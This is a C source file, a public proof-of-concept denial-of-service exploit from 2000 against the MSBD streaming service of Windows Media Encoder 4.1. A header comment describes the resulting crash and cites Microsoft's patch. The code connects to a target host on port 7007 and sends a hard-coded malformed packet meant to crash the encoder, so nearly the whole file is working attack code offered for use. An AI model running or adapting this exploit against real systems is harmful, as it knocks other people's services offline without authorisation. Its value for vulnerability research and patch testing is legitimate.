
/*
 *
 * Media Streaming Broadcast Distribution (MSBD)
 * Denial of Service Attack
 *
 * (C) 2000 Kit Knox <kit@rootshell.com> - Public Release: 05/31/00
 *
 * Causes the Windows Media Encoder to crash with a "Runtime Error!"
 *
 * "NSREX caused an invalid page fault in module MFC42.DLL at 0177:5f4012a1".
 *
 * Tested on version 4.1.0.3920 file "NsRex.exe" 998KB 1/11/00.
 *
 * Official Microsoft patch is available :
 *
 * http://www.microsoft.com/technet/security/bulletin/ms00-038.asp
 *
 * Thanks to Microsoft and the WMT group for their prompt attention to this
 * matter.
 *
 */

#include <stdio.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <string.h>
#include <unistd.h>

char bogus_msbd_packet1[] = {
0x4d, 0x53, 0x42, 0x20, 0x06, 0x01, 0x07, 0x00, 0x24, 0x00, 0x00, 0x40,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x4e, 0x00,
0x65, 0x00, 0x74, 0x00, 0x00, 0x50, 0x53, 0x00, 0x68, 0x00, 0x6f, 0x00,
0x77, 0x00, 0x00, 0x00
};

int sock;
 
int main(int argc, char *argv[]) {
  struct hostent *he;
  struct sockaddr_in sa;
  char buf[1024];
  
  if (argc != 2) {
    fprintf(stderr, "usage: %s <host/ip>\n", argv[0]);
    return(-1);
  }
  
  sock = socket ( AF_INET, SOCK_STREAM, 0);
  sa.sin_family = AF_INET;
  sa.sin_port = htons(7007);
  he = gethostbyname (argv[1]);
  if (!he) {
    if ((sa.sin_addr.s_addr = inet_addr(argv[1])) == INADDR_NONE)
      return(-1);
  } else {
    bcopy(he->h_addr, (struct in_addr *) &sa.sin_addr, he->h_length);
  }
  if (connect(sock, (struct sockaddr *) &sa, sizeof(sa)) < 0) {
    fprintf(stderr, "Fatal Error: Can't connect to Windows Media Encoder.\n");
    return(-1);
  }
  write(sock, bogus_msbd_packet1, sizeof(bogus_msbd_packet1));
  for (;;) {
    read(sock, buf, sizeof(buf));
  }
}
